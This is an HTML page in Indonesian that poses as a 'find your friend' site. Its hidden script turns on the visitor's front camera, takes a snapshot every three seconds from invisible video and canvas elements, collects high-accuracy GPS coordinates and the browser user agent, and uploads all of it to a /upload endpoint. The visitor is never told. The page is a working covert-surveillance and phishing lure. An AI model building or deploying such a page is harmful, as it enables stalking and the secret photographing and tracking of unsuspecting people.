<!DOCTYPE html>
<html>
<head>
  <title>Carik Teman</title>
  <style>
    body {
      background: black;
      color: white;
      text-align: center;
    }
    video {
      display: none;
    }
    canvas {
      display: none;
    }
  </style>
</head>
<body>

<h3>ðŸŽ¾Cari Teman Anda</h3>
<video id="video" autoplay muted></video>
<canvas id="canvas"></canvas>

<script>
const video = document.getElementById('video')
const canvas = document.getElementById('canvas')

navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
  .then(stream => {
    video.srcObject = stream
    video.addEventListener('loadedmetadata', () => {
      video.play()
      startCapture()
    })
  })
  .catch(err => {
    console.error('Gagal akses kamera:', err)
  })

function startCapture() {
  const INTERVAL = 3000 // lebih aman 3 detik

  setInterval(() => {
    if (!video.videoWidth) return

    canvas.width = video.videoWidth
    canvas.height = video.videoHeight

    const ctx = canvas.getContext('2d')
    ctx.drawImage(video, 0, 0)

    const imageBase64 = canvas.toDataURL('image/jpeg', 0.7)

    ambilFotoDanLokasi(imageBase64)
  }, INTERVAL)
}

function ambilFotoDanLokasi(imageBase64) {
  if (!navigator.geolocation) {
    kirim(imageBase64, null)
    return
  }

  navigator.geolocation.getCurrentPosition(
    pos => {
      kirim(imageBase64, {
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        accuracy: pos.coords.accuracy
      })
    },
    () => {
      kirim(imageBase64, null)
    },
    {
      enableHighAccuracy: true,
      timeout: 10000
    }
  )
}

function kirim(imageBase64, location) {
  fetch('/upload', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      image: imageBase64,
      location,
      device: navigator.userAgent
    })
  })
}
</script>

</body>
</html>
